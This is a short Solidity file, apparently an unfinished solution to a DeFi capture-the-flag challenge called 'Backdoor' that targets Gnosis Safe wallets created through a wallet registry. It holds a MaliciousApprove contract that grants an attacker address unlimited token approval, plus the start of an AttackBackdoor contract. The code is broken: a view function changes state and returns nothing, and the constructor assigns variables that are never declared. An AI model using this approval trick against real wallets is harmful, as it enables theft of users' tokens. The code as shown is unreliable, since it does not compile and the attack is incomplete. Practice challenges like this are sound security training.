// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Backdoor.sol";

interface IGnosisFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract MaliciousApprove {

    function approve(address attacker, IERC20 token) external view returns (bool) {
        token.approve(attacker, type(uint256).max);
    }

}

contract AttackBackdoor {

    WalletRegistry private immutable walletRegistry; 
    IGnosisFactory private immutable gnosisFactory;
    GnosisSafe private immutable gnosisSafe; 
    MaliciousApprove private immutable maliciousApprove;
    IERC20 private immutable token;

    constructor(address _walletRegistry, address[] memory users) {
        
        walletRegistry = WalletRegistry(_walletRegistry);
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        factory = IGnosisFactory(walletRegistry.walletFactory());
    }

}
